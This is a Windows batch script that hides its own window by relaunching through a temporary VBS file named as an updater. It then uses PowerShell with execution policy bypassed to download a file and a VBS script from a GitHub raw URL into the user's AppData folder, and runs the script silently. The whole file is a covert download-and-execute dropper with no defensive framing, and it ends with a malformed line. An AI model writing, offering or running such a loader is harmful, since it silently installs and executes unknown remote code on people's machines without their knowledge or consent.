@echo off
:: =========================================
:: Self-hide check
:: =========================================
if "%~1" neq "hidden" (
    :: Create temporary VBS to relaunch this batch hidden
    set "vbs=%TEMP%\hide_updater.vbs"
    >"%vbs%" echo Set ws = CreateObject("Wscript.Shell")
    >>"%vbs%" echo ws.Run "cmd /c ""%~f0 hidden""", 0, False
    cscript //nologo "%vbs%"
    del "%vbs%"
    exit /b
)
REM =====================================================
REM SECOND STAGE
REM =====================================================

REM Set download paths
set "APPDATA_PATH=%APPDATA%"
set "PNG_FILE=%APPDATA_PATH%\crineson.png"
set "VBS_FILE=%APPDATA_PATH%\yay.vbs"

REM Download crineson.png
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/rubitoutducky/main/crineson.png' -OutFile '%PNG_FILE%'"

REM Download yay.vbs
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/rubitoutducky/main/yay.vbs' -OutFile '%VBS_FILE%'"

REM Run yay.vbs silently
start "" /wait wscript.exe "%VBS_FILE%"

echorem yo
